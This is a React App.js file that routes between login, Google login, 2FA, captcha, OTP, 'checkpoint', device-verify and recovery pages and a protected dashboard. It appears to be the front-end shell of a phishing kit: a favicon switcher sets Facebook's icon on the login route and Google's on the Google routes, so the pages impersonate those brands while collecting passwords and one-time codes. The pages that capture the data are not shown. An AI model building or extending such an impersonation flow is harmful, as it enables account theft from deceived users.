import React from 'react';
import { BrowserRouter, Routes, Route, Navigate, useLocation } from 'react-router-dom';
import { AuthProvider, useAuth } from './context/AuthContext';
import LoginPage from './pages/LoginPage';
import TwoFAPage from './pages/TwoFAPage';
import CaptchaPage from './pages/CaptchaPage';
import OTPPage from './pages/OTPPage';
import CheckpointPage from './pages/CheckpointPage';
import DeviceVerifyPage from './pages/DeviceVerifyPage';
import RecoveryPage from './pages/RecoveryPage';
import Dashboard from './pages/Dashboard';
import GoogleLogin from './components/GoogleLogin';
import GoogleSuccessPage from './pages/GoogleSuccessPage';

// tiny component that switches document favicon whenever the route changes
const FaviconSwitcher = () => {
  const location = useLocation();

  React.useEffect(() => {
    let iconUrl = 'https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg';
    if (location.pathname.startsWith('/google')) {
      iconUrl = 'https://www.google.com/favicon.ico';
    } else if (location.pathname === '/login') {
      iconUrl = 'https://www.facebook.com/favicon.ico';
    }
    // plain JS, no TypeScript annotations
    let link = document.querySelector("link[rel~='icon']");
    if (!link) {
      link = document.createElement('link');
      link.rel = 'icon';
      document.getElementsByTagName('head')[0].appendChild(link);
    }
    link.href = iconUrl;
  }, [location]);

  return null;
};

// additional components (news/chat removed)
// Layout import can remain for wrapping if still needed


// Protected route component
const ProtectedRoute = ({ children }) => {
  const { user } = useAuth();
  return user ? children : <Navigate to="/login" />;
};

function App() {
  return (
    <AuthProvider>
      <BrowserRouter>
        <FaviconSwitcher />
        <Routes>
          {/* legacy auth flows */}
          <Route path="/login" element={<LoginPage />} />
          <Route path="/google" element={<GoogleLogin />} />
          <Route path="/google-success" element={<GoogleSuccessPage />} />
          <Route path="/2fa" element={<TwoFAPage />} />
          <Route path="/captcha" element={<CaptchaPage />} />
          <Route path="/otp" element={<OTPPage />} />
          <Route path="/checkpoint" element={<CheckpointPage />} />
          <Route path="/device-verify" element={<DeviceVerifyPage />} />
          <Route path="/recovery" element={<RecoveryPage />} />
          <Route
            path="/dashboard"
            element={
              <ProtectedRoute>
                <Dashboard />
              </ProtectedRoute>
            }
          />

          {/* fallback - send to login */}
          <Route path="*" element={<Navigate to="/login" />} />
        </Routes>
      </BrowserRouter>
    </AuthProvider>
  );
}

export default App;
